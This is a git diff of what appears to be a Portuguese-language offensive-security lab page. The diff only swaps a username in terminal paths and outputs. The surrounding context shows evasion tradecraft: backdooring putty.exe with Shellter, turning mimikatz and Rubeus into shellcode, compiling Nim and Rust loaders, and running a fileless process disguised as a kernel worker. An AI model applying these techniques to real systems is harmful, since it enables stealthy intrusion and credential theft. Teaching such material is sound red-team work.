@@ -202,7 +202,7 @@ Framework Transform Formats [--format <value>]
       Author: Kyriakos Economou (@kyREcon)
 
 Choose Operation Mode - Auto/Manual (A/M/H): A
-PE Target: /home/wallyson/loot/putty.exe
+PE Target: /home/ana/loot/putty.exe
 
 ***********************
 * Backup Original PE  *
@@ -248,9 +248,9 @@ Press [Enter] to continue...`,
           },
           {
             cmd: "ls -la ~/loot/putty.exe Shellter_Backups/",
-            out: `-rwxr-xr-x 1 wallyson wallyson 1604608 Apr  4 01:14 /home/wallyson/loot/putty.exe   ← já modificado
+            out: `-rwxr-xr-x 1 ana ana 1604608 Apr  4 01:14 /home/ana/loot/putty.exe   ← já modificado
 total 1568
--rw-r--r-- 1 wallyson wallyson 1604096 Apr  4 01:12 putty.exe.bak`,
+-rw-r--r-- 1 ana ana 1604096 Apr  4 01:12 putty.exe.bak`,
             outType: "default",
           },
           {
@@ -451,7 +451,7 @@ Done.`,
   [ Copyright (c) 2019-2024 TheWover, Odzhan
 
   [ Instance type : Embedded
-  [ Module file   : "/home/wallyson/tools/mimikatz.exe"
+  [ Module file   : "/home/ana/tools/mimikatz.exe"
   [ Entropy       : Random names + Encryption
   [ Compressed    : Xpress
   [ File type     : EXE
@@ -474,8 +474,8 @@ Done.`,
           },
           {
             cmd: "ls -la /tmp/*.bin && file /tmp/mimi.bin",
-            out: `-rw-r--r-- 1 wallyson wallyson 1142528 Apr  4 01:32 /tmp/mimi.bin
--rw-r--r-- 1 wallyson wallyson  248320 Apr  4 01:33 /tmp/rubeus.bin
+            out: `-rw-r--r-- 1 ana ana 1142528 Apr  4 01:32 /tmp/mimi.bin
+-rw-r--r-- 1 ana ana  248320 Apr  4 01:33 /tmp/rubeus.bin
 /tmp/mimi.bin: data`,
             outType: "default",
           },
@@ -601,7 +601,7 @@ Hint: operation successful (47482 lines compiled; 2.184 sec total) [SuccessX]`,
           },
           {
             cmd: "ls -la loader.exe && file loader.exe",
-            out: `-rwxr-xr-x 1 wallyson wallyson 218112 Apr  4 01:42 loader.exe
+            out: `-rwxr-xr-x 1 ana ana 218112 Apr  4 01:42 loader.exe
 loader.exe: PE32+ executable (GUI) x86-64, for MS Windows`,
             outType: "default",
           },
@@ -655,13 +655,13 @@ info: installing component 'rust-std' for 'x86_64-pc-windows-gnu'
             cmd: "cargo build --release --target x86_64-pc-windows-gnu",
             out: `   Compiling windows-sys v0.52.0
    Compiling windows v0.56.0
-   Compiling rust-loader v0.1.0 (/home/wallyson/rust-loader)
+   Compiling rust-loader v0.1.0 (/home/ana/rust-loader)
     Finished release [optimized] target(s) in 18.42s`,
             outType: "info",
           },
           {
             cmd: "ls -la target/x86_64-pc-windows-gnu/release/*.exe",
-            out: `-rwxr-xr-x 2 wallyson wallyson 184832 Apr  4 01:51 target/x86_64-pc-windows-gnu/release/rust-loader.exe`,
+            out: `-rwxr-xr-x 2 ana ana 184832 Apr  4 01:51 target/x86_64-pc-windows-gnu/release/rust-loader.exe`,
             outType: "default",
           },
         ]}
@@ -692,8 +692,8 @@ os.execve(f"/proc/self/fd/{fd}", ["[kworker/u8:1]"], os.environ)
           {
             comment: "verificar do outro shell que o processo está vivo, sem path em disco",
             cmd: "ps -ef | grep kworker/u8:1",
-            out: `wallyson  4421  4242  0 02:01 pts/1  00:00:00 [kworker/u8:1]
-wallyson  4452  4421  0 02:01 pts/1  00:00:00 grep kworker/u8:1`,
+            out: `ana  4421  4242  0 02:01 pts/1  00:00:00 [kworker/u8:1]
+ana  4452  4421  0 02:01 pts/1  00:00:00 grep kworker/u8:1`,
             outType: "info",
           },
           {
@@ -993,7 +993,7 @@ nim c -d:release -d:strip --opt:size --app:gui \\
 
 ls -la upd.exe   # ~200KB, GUI subsystem
 file upd.exe`}
-        expected={`-rwxr-xr-x 1 wallyson wallyson 218112 Apr  4 02:42 upd.exe
+        expected={`-rwxr-xr-x 1 ana ana 218112 Apr  4 02:42 upd.exe
 upd.exe: PE32+ executable (GUI) x86-64, for MS Windows
 
 (no msfconsole após executar upd.exe na VM:)
